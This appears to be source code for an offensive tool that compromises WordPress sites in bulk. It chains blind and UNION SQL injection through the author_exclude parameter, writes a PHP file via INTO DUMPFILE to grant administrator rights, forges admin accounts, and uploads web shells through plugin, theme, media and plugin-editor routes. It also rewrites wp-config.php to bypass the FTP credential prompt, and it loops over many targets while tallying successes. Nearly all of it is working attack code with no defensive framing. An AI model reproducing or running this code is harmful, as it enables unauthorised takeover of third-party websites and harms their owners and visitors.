...
_DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) Chrome/131.0.0.0 Safari/537.36"
...
def _needs_ftp_creds(html_body):
    if not html_body:
        return False
    low = html_body.lower()
    return any(m in low for m in _FTP_FORM_MARKERS)

def _ftp_form_fields(html_body):
    fields = {}
    for m in re.finditer(r"<input[^>]+>", html_body or "", re.I):
        ...
        if t in ("checkbox", "radio"):
            if name == "connection_type":
                if val == "direct" or "direct" in tag.lower():
                    fields[name] = "direct"
                continue
    ...
    for m in re.finditer(
        ...
        html_body or "", re.I | re.S,
    ):
        name, inner = html.unescape(m.group(1)), m.group(2)
        om = re.search(r'<option[^>]*selected[^>]*value=["\']([^"\']*)["\']', inner, re.I)
        if not om:
            om = re.search(r'<option[^>]*value=["\']([^"\']*)["\']', inner, re.I)
        if om:
            fields[name] = html.unescape(om.group(1))
    fields.update(_ftp_direct_fields())
    fields["connection_type"] = "direct"
    return fields

def _ftp_form_action(html_body, fallback, base):
    m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html_body or "", re.I)
    if not m or not m.group(1):
        return fallback
    action = html.unescape(m.group(1).strip())
    ...
    return base.rstrip("/") + "/wp-admin/" + action.lstrip("/")
        ...
        for pos in range(1, max_len + 1):
            ...
            while lo < hi:
                ...
                if self._t(f"{probe} > {mid}"):
                    ...
                    hi = mid
            buf.append(lo)
            if pos % 8 == 0 and not getattr(self.c, "_quiet_blind", False):
                log(f"    blind extract: {pos} bytes ({self.req} reqs)", "*")
...
class UnionSQLi:
    ...
    def avail(self):
        if getattr(self.c, "_union_sink", None):
            if self._read("SELECT 0x4f4b") == "OK":
                return True
            self.c._union_sink = None
...
def _wp_row(i, **k):
    p = {"body":"","title":"","status":"publish","slug":"", "parent":0,"kind":"post","author":0}
    p.update(k)
...
class AdminCreator:
    ...
    def create(self, quiet=False):
        ...
        # ALWAYS try UNION first (1 req) — blind extract is ~8x slower per byte
        if self.client._read_union_ok_quick():
            src = s
        elif self.client._union_sink:
            src = s
        elif s.avail():
            src = s
        ...
        self._ensure_admin_role(src, base_prefix, blog_prefix, username)
    ...
    def _get_oembed_backing(self, src, ptable, nonce):
        ...
        log(f"    backing: synthetic forge {ids} (fallback — chain may fail)", "!")
        return embeds or self._dummy_embeds(nonce), ids
    ...
    def _embed_bases(self):
        ...
        try:
            ...
            root = urllib.parse.urlunsplit((s.scheme, s.netloc, "/", "", ""))
            if root not in seen:
                add(root)
            if s.path and s.path != "/":
                p = urllib.parse.urlunsplit((s.scheme, s.netloc, s.path, "", ""))
                if p not in seen:
                    add(p)
        except Exception:
            pass
    ...
    def _recover_oembed_ids(self, src, ptable, embeds, attempts=1, delay=0.25):
        ...
        for a in self._OEMBED_ATTRS:
            if a != self._oembed_attr and a not in attrs:
                attrs.append(a)
        for attr in attrs:
            ids = []
            for u in embeds:
    ...
    def _user_exists(self, src, prefix, username, attempts=2, delay=0.3):
    ...
    def _ensure_admin_role(self, src, base_prefix, blog_prefix, username):
        """Ensure user has administrator capabilities via SQL INTO DUMPFILE.

        UNION SELECT cannot execute DML (INSERT/UPDATE). Instead we write
        a tiny PHP file via INTO DUMPFILE that does the INSERT, trigger it
        via HTTP, then proceed.
        """
        uhex = _mysql_hex(username)
        try:
            uid = src.integer(
                f"SELECT ID FROM `{base_prefix}users` WHERE user_login={uhex} ORDER BY ID DESC LIMIT 1"
            )
        except Exception:
            return
        if uid < 1:
        ...
        try:
            has_cap = src.integer(
                f"SELECT COUNT(*) FROM `{base_prefix}usermeta` "
                f"WHERE user_id={uid} AND meta_key={_mysql_hex(blog_prefix + 'capabilities')} LIMIT 1"
            )
        except Exception:
            has_cap = 0
        ...
        cap_val = 'a:1:{s:13:"administrator";b:1;}'
        lvl_key = blog_prefix + "user_level"
        injector_php = (
            b"<?php "
            b"$p=dirname(__FILE__).'/../../../';"
            b"require_once($p.'wp-load.php');"
            b"global $wpdb;"
            b"$u=" + str(uid).encode() + b";"
            b"$wpdb->query($wpdb->prepare("
            b"'INSERT INTO `" + base_prefix.encode() + b"usermeta` (user_id,meta_key,meta_value) "
            b"VALUES (%d,%s,%s) ON DUPLICATE KEY UPDATE meta_value=VALUES(meta_value)',"
            b"$u,'" + cap_key.encode() + b"','" + cap_val.encode() + b"'));"
            b"$wpdb->query($wpdb->prepare("
            b"'INSERT INTO `" + base_prefix.encode() + b"usermeta` (user_id,meta_key,meta_value) "
            b"VALUES (%d,%s,%s) ON DUPLICATE KEY UPDATE meta_value=VALUES(meta_value)',"
            b"$u,'" + lvl_key.encode() + b"','10'));"
            b"echo 'ok';"
        )
        name = "w" + secrets.token_hex(4) + ".php"
        if self._dumpfile_write(injector_php, name):
            urls = self._dumpfile_probe_urls(name)
            for url in urls:
                try:
                    body, _, status = self._render_client._get(url)
                    if body and "ok" in (body or "").lower()[:20]:
                        log(f"    admin role: injected via {url}", "+")
                        return
                except Exception:
                    continue
        log("    admin role: dumpfile failed — chain may not have escalated", "!")

    def _dumpfile_write(self, php_bytes, name):
        """Write PHP via UNION SELECT INTO DUMPFILE using write sink."""
        hex_payload = "0x" + php_bytes.hex()
        paths = self._dumpfile_paths(name)
        sinks = []
        if self.client._write_sink:
            sinks.append(self.client._write_sink)
        for s in _WRITE_SINKS[:2]:
        ...
        for p in primers:
            if p not in seen_p:
                seen_p.append(p)
        wrote = False
        for abs_path, _ in paths:
            path_hex = "0x" + abs_path.encode().hex()
            inj = f"1) AND 1=0 UNION SELECT {hex_payload} INTO DUMPFILE {path_hex}-- -"
            for name2, path, extra in sinks:
                qs = {"author_exclude": inj}
                qs.update(extra)
                reqs = [
    ...
    def _dumpfile_paths(self, name):
        """Build (abs_path, web_url) pairs for DUMPFILE targets."""
        y, m = time.strftime("%Y"), time.strftime("%m")
        rels = [
            f"wp-content/uploads/{name}",
            f"wp-content/uploads/{y}/{m}/{name}",
            f"wp-content/{name}",
            name,
        ]
        host = urllib.parse.urlsplit(self.u).hostname or ""
        ...
        if host_short:
            roots.insert(0, f"/home/{host_short}/public_html")
            roots.insert(0, f"/var/www/{host_short}/public_html")
        pairs = []
        seen = set()
        for root in roots:
            for rel in rels[:2]:
    ...
    def _dumpfile_probe_urls(self, name):
        """Web URLs to probe for the dumped file."""
        y, m = time.strftime("%Y"), time.strftime("%m")
        rels = [
            f"wp-content/uploads/{name}",
            f"wp-content/uploads/{y}/{m}/{name}",
        ...
        return [f"{self.u}/{rel}" for rel in rels]

    def _render_meta_write(self, sql_statement):
        pass
...
def _http_open(opener, cfg, url, data=None, content_type=None, referer=None,
               timeout=None, jar=None):
    """Shared HTTP request for LoginVerifier, CoreUpdater, ShellUploader."""
    ...
    to = timeout if timeout is not None else max(cfg.timeout, 30.0)
    last_exc = None
    for a in range(cfg.retries + 1):
        try:
            r = opener.open(req, timeout=to)
            try:
                body = r.read().decode(errors="replace")
            except Exception:
                body = ""
            ...
            if a < cfg.retries:
                time.sleep(0.4 * (a + 1))
    raise last_exc if last_exc else Exception("HTTP request failed")
...
class LoginVerifier:
    ...
    def _open(self, url, data=None, referer=None):
        return _http_open(self._opener, self.c, url, data=data, referer=referer)
...
class CoreUpdater:
    ...
    def detect_version(self):
        for path in ("/wp-admin/update-core.php", "/wp-admin/about.php", "/wp-admin/"):
            try:
    ...
    def _do_core_upgrade(self):
        ...
        for _ in range(2):
            if not body or not _needs_ftp_creds(body):
                break
            try:
                fields2 = _ftp_form_fields(body)

                for k in ("_wpnonce", "version", "locale", "upgrade"):
                    if k in fields and k not in fields2:
                        fields2[k] = fields[k]
                fields2["connection_type"] = "direct"
                act2 = _ftp_form_action(body, action_url, self.base)
                body, final, status = self._open(
                    act2, data=fields2,
                    referer=self.base + "/wp-admin/update-core.php",
                    timeout=180,
                )
                log("    core update: FTP/FS bypass → connection_type=direct", "*")
            except Exception as e:
    ...
    def _open(self, url, data=None, referer=None, timeout=None):
        return _http_open(self._opener, self.c, url, data=data, referer=referer, timeout=timeout)
...
class ShellUploader:
    ...
    def __init__(self, base_url, c=None, shell_path=None, jar=None, opener=None, wp_path=None):
        ...
        self._slug = "w" + secrets.token_hex(5)
        self._jar = jar if jar is not None else CookieJar()
        self._opener = opener or self.c.opener(urllib.request.HTTPCookieProcessor(self._jar))
        self.last_error = ""
        self.shell_url = None
    ...
    def deploy(self):
        ...
        try:
            ...
            if url:
                ...
                for u in self._plugin_url_variants(url):
        ...
        for url in candidates:
            live = self._confirm_shell(url, retries=4, delay=0.8)
            if live:
                self.shell_url = live
                log(f"    shell live OK (plugin)", "*")
                return live
        if candidates:
            log(f"    shell probe fail (plugin): {candidates[0]}", "!")


        try:
            url = self._deploy_media(php)
            if url:
                live = self._confirm_shell(url, retries=3, delay=0.6)
                if live:
                    self.shell_url = live
                    log(f"    shell live OK (media)", "*")
                    return live
                self.last_error = f"media uploaded but not live: {url}"
        except Exception as e:
        ...
        try:
            url = self._deploy_theme(php)
            if url:
                live = self._confirm_shell(url, retries=3, delay=0.6)
                if live:
                    self.shell_url = live
                    log(f"    shell live OK (theme)", "*")
                    return live
                log(f"    shell probe fail (theme): {url}", "!")
                self.last_error = f"theme uploaded but not live: {url}"
        except Exception as e:
            self.last_error = f"theme: {type(e).__name__}: {e}"
            log(f"    shell theme upload fail: {self.last_error}", "!")


        try:
            url = self._deploy_via_plugin_edit(php)
            if url:
                live = self._confirm_shell(url, retries=2, delay=0.5)
                if live:
                    self.shell_url = live
                    log(f"    shell live OK (plugin-edit)", "*")
                    return live
                self.last_error = f"plugin-edit written but not live: {url}"
        except Exception as e:
            self.last_error = f"plugin-edit: {type(e).__name__}: {e}"
            log(f"    shell plugin-edit fail: {self.last_error}", "!")


        try:
            url = self._deploy_via_wpconfig(php)
            if url:
                live = self._confirm_shell(url, retries=3, delay=0.8)
                if live:
                    self.shell_url = live
                    log(f"    shell live OK (wp-config bypass)", "*")
                    return live
                self.last_error = f"wp-config bypass written but not live: {url}"
        except Exception as e:
            self.last_error = f"wp-config: {type(e).__name__}: {e}"
            log(f"    shell wp-config bypass fail: {self.last_error}", "!")

        raise RuntimeError(self.last_error or "shell upload failed")

    def _plugin_url_variants(self, url):
        out = [url]
        try:
            p = urllib.parse.urlsplit(url)
            path = p.path or ""
            ...
            if "/wp-content/plugins/" in path:
                out.append(urllib.parse.urlunsplit((p.scheme, p.netloc, path, "", "")))

            rel = f"/wp-content/plugins/{self._slug}/{self._slug}.php"
            for b in self._admin_url_candidates():
                out.append(b.rstrip("/") + rel)
    ...
    def _deploy_plugin(self, php):
        ...
        base_fields.update(_ftp_direct_fields())
        body, ctype = self._multipart(
            base_fields,
            {"pluginzip": (f"{self._slug}.zip", zip_bytes)},
        )
        upload_url = f"{used_base}/wp-admin/update.php?action=upload-plugin"
        ...
        for round_i in range(2):
            if not resp or not _needs_ftp_creds(resp):
                break
            log(f"    plugin FTP/FS prompt → bypass direct (try {round_i+1})", "!")
            resp, final, status = self._submit_ftp_bypass(
                resp, final or upload_url,
        ...
        rel = f"/wp-content/plugins/{self._slug}/{self._slug}.php"
        guessed = used_base.rstrip("/") + rel
        if resp:
            m = re.search(
                rf'https?://[^\s"\'<>]+/wp-content/plugins/{re.escape(self._slug)}/[^\s"\'<>]+\.php',
                resp, re.I,
            )
            if m:
                return m.group(0).replace("&amp;", "&")
            m = re.search(
                rf'/wp-content/plugins/{re.escape(self._slug)}/[^\s"\'<>]+\.php',
                resp, re.I,
            )
            if m:
                root = urllib.parse.urlsplit(used_base)
                return f"{root.scheme}://{root.netloc}{m.group(0)}"

            low = resp.lower()
            if "plugin installed successfully" in low or "installed successfully" in low:
                return guessed
        return guessed

    def _submit_ftp_bypass(self, page, action_url, used_base, zip_bytes=None, extra_fields=None):
        fields = _ftp_form_fields(page)
        if extra_fields:
            fields.update(extra_fields)
        fields.update(_ftp_direct_fields())
        fields["connection_type"] = "direct"
        action_url = _ftp_form_action(page, action_url, used_base)
        referer = used_base.rstrip("/") + "/wp-admin/"
        if zip_bytes is not None:
            body, ctype = self._multipart(
                fields, {"pluginzip": (f"{self._slug}.zip", zip_bytes)},
            )
            return self._open(action_url, data=body, content_type=ctype, referer=referer)
        return self._open(action_url, data=fields, referer=referer)
    ...
    def _deploy_media(self, php):
        ...
        names = (
            ...
            f"{self._slug}.phtml",
            f"{self._slug}.php5",
            f"{self._slug}.php.jpg",
            f"{self._slug}.jpg.php",
        )
        for name in names:
            body, ctype = self._multipart(
                {
            ...
            if not resp:
                continue
            url = self._parse_media_url(resp)
            if url:
                return url
        raise RuntimeError("media upload returned no URL (PHP upload often blocked)")

    def _deploy_theme(self, php):
        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        used_base = self.base
        for admin in admin_paths:
            for tab in (
                f"{admin}/wp-admin/theme-install.php?upload",
                f"{admin}/wp-admin/theme-install.php?browser=upload",
                f"{admin}/wp-admin/theme-install.php",
            ):
                try:
                    page, final, status = self._open(tab)
                except Exception:
                    continue
                if not page or (status and status >= 400):
                    continue
                if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                    continue
                nonce = self._nonce_any(page, "theme-upload") or self._nonce_any(page, "theme") or self._nonce_any(page)
                if nonce:
                    used_base = admin
                    break
            if nonce:
        ...
        body, ctype = self._multipart(
            base_fields,
            {"themezip": (f"{self._slug}.zip", zip_bytes)},
        )
        upload_url = f"{used_base}/wp-admin/update.php?action=upload-theme"
        resp, final, status = self._open(
            upload_url,
            data=body, content_type=ctype,
            referer=f"{used_base}/wp-admin/theme-install.php?upload",
        )
        for round_i in range(2):
            if not resp or not _needs_ftp_creds(resp):
                break
            log(f"    theme FTP/FS prompt → bypass direct (try {round_i+1})", "!")
            resp, final, status = self._submit_ftp_bypass(
                resp, final or upload_url,
                used_base, zip_bytes=zip_bytes, extra_fields={
                    "install-theme-submit": "Install Now",
                    "_wpnonce": nonce,
                    "themezip_name": f"{self._slug}.zip",
                },
            )
        rel = f"/wp-content/themes/{self._slug}/{self._slug}.php"
        guessed = used_base.rstrip("/") + rel
        if resp:
            m = re.search(
                rf'https?://[^\s"\'<>]+/wp-content/themes/{re.escape(self._slug)}/[^\s"\'<>]+\.php',
                resp, re.I,
            )
            if m:
                return m.group(0).replace("&amp;", "&")
            low = resp.lower()
            if "theme installed successfully" in low or "installed successfully" in low:
                return guessed
        return guessed

    def _theme_zip(self, php):
        style = (
            f"/*\nTheme Name: {self._slug}\nDescription: helper\nVersion: 1.0\n*/\n"
        ).encode()
        raw = php.lstrip()
        ...
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/style.css", style)
            z.writestr(f"{self._slug}/functions.php", func_php)
            z.writestr(f"{self._slug}/{self._slug}.php", func_php)
        return buf.getvalue()

    def _deploy_via_plugin_edit(self, php):
        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        plugin_file = None
        ...
        for admin in admin_paths:
            ...
            if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                continue
            nonce = self._nonce_any(page, "edit-theme-plugin-file") or self._nonce_any(page, "plugin-editor") or self._nonce_any(page)
            if not nonce:
                continue
            plugin_file = self._pick_editable_plugin(page)
            if plugin_file:
                used_base = admin
                break
        if not nonce or not plugin_file:
            raise RuntimeError("plugin-editor nonce/file not found")
        raw = php.lstrip()
        if raw.startswith(b"<?php"):
            content = raw
        elif raw.startswith(b"<?"):
        ...
        fields = {
            ...
            "file": plugin_file,
            "plugin": plugin_file,
            "newcontent": content.decode("utf-8", "replace"),
            "submit": "Update File",
        }
        fields.update(_ftp_direct_fields())
        resp, final, status = self._open(
            f"{used_base}/wp-admin/plugin-editor.php",
            data=fields,
            referer=f"{used_base}/wp-admin/plugin-editor.php?file={urllib.parse.quote(plugin_file)}",
        )
        for round_i in range(2):
            if not resp or not _needs_ftp_creds(resp):
                break
            log(f"    plugin-edit FTP/FS prompt → bypass (try {round_i+1})", "!")
            resp, final, status = self._submit_ftp_bypass(
                resp, final or f"{used_base}/wp-admin/plugin-editor.php",
                used_base, zip_bytes=None, extra_fields=fields,
            )
        low = (resp or "").lower()
        if "file edited successfully" in low or "updated" in low:
            pass
        rel = f"/wp-content/plugins/{plugin_file}"
        return used_base.rstrip("/") + rel

    @staticmethod
    def _pick_editable_plugin(page):
        if not page:
            return None
        for pat in (
            r'<option[^>]*value="([^"]+\.php)"[^>]*>[^<]*</option>',
            r'<option[^>]*value="([^"]+)"[^>]*>',
        ):
            for m in re.finditer(pat, page, re.I):
                val = html.unescape(m.group(1))
                if val and ".php" in val and "/" in val:
                    if not val.startswith("/"):
                        val = val.lstrip("/")
                    return val
        m = re.search(r'name=["\']plugin["\'][^>]*value=["\']([^"\']+)["\']', page, re.I)
        if m:
            return html.unescape(m.group(1))
        return None

    def _deploy_via_wpconfig(self, php):
        admin_paths = self._admin_url_candidates()
        page = None
        nonce = None
        plugin_file = None
        ...
        for admin in admin_paths:
            ...
            if "wp-login" in (final or "").lower() or self._looks_like_login_page(page):
                continue
            nonce = self._nonce_any(page, "edit-theme-plugin-file") or self._nonce_any(page)
            if not nonce:
                continue
            plugin_file = self._pick_editable_plugin(page)
            if plugin_file:
                ...
                break
        if not nonce or not plugin_file:
            raise RuntimeError("wp-config bypass: plugin-editor not accessible")


        inj = (
            b'<?php '
            b"$f=dirname(__FILE__).'/../../../wp-config.php';"
            b"$c=@file_get_contents($f);"
            b"if($c && strpos($c,'FS_METHOD')===false){"
            b"$c=preg_replace('/^(<\\?php)/m',\"\\ndefine('FS_METHOD','direct');\\n\",$c);"
            b"@file_put_contents($f,$c);}"
            b"echo 'ok';"
        )
        fields = {
            "_wpnonce": nonce,
            ...
            "file": plugin_file,
            "plugin": plugin_file,
            "newcontent": inj.decode("utf-8", "replace"),
            "submit": "Update File",
        }
        fields.update(_ftp_direct_fields())
        resp, final, status = self._open(
        ...
        low = (resp or "").lower()
        if "file edited successfully" not in low and "updated" not in low:
            raise RuntimeError("wp-config bypass: plugin file edit failed")


        rel = f"/wp-content/plugins/{plugin_file}"
        trigger_url = used_base.rstrip("/") + rel
        try:
            self._open(trigger_url)
        except Exception:
            pass
        ...
        try:
            ...
            pass
        raise RuntimeError("wp-config bypass: upload still failed after FS_METHOD=direct")

    @staticmethod
    def _parse_media_url(resp):
        if not resp:
            return None
        ...
        for pat in (
            ...
            r'https?://[^\s"\'<>]+\.(?:php|phtml|php5|php\.\w+|jpe?g|png)',
            r'"url"\s*:\s*"(https?://[^"]+)"',
        ):
            m = re.search(pat, resp, re.I)
            if m:
                return (m.group(1) if m.lastindex else m.group(0)).replace("\\/", "/")
        return None
    ...
    def _confirm_shell(self, url, retries=3, delay=0.7):
        if not url:
            return None
        ok_low = _SHELL_OK_TITLE.lower()
        for attempt_mode in ("probe", "bare"):
            probe = self._shell_probe_url(url) if attempt_mode == "probe" else url
            for a in range(max(1, retries)):
                if a:
                    ...
                    time.sleep(0.35)
                try:
                    body, final, status = self._open(probe)
                except Exception:
                    continue
                ...
                if m and ok_low in m.group(1).lower():
                    return probe
                if ok_low in text.lower() and "<?php" not in text.lower() and "<?=" not in text.lower():
                    return probe
        return None
    ...
    def _open(self, url, data=None, content_type=None, referer=None):
        return _http_open(self._opener, self.c, url, data=data,
                          content_type=content_type, referer=referer)
...
def process_target(target, c, args, idx, total):
    ...
    try:
        ...
        try:
            ...
            try:
                creator.client._quiet_blind = not is_single
            ...
            if verify or shell_file or want_update:
                ...
                try:
                    ...
                    if AdminCreator._is_dns_err(e):
                        ...
                        raise
                login_diag = verifier.last_reason or login_diag or ""
            ...
            if shell_file and login_ok:
                ...
                vlog("login failed — retrying for shell upload...", "!")
                lv2 = LoginVerifier(target, c)
                if lv2.login(adm.username, adm.password):
                    shell_url = self_deploy_shell(
                        target, c, shell_file, verifier=lv2, adm=adm,
                    )
                    login_ok = True
                    verifier = lv2
                    vlog(f"login via {lv2.login_url}", "*")
                else:
                ...
                if is_single:
                    ...
                    def _bg_update(v=verifier, t=target):
                        try:
                            ...
                            log(f"CORE FAIL {t} -> {e}", "!")
                    t = threading.Thread(target=_bg_update, daemon=False)
                    t.start()
            ...
            for future in as_completed(futures):
                ...
                if not is_single and done_count % 50 == 0 and done_count < total:
                    with stats_lock:
                        v, s, f = total_vuln, total_success, total_fail
                    log(f"  [{done_count}/{total}] vuln={v} ok={s} fail={f}", "*")
                elif not is_single and done_count == total:
                    pass
    print()
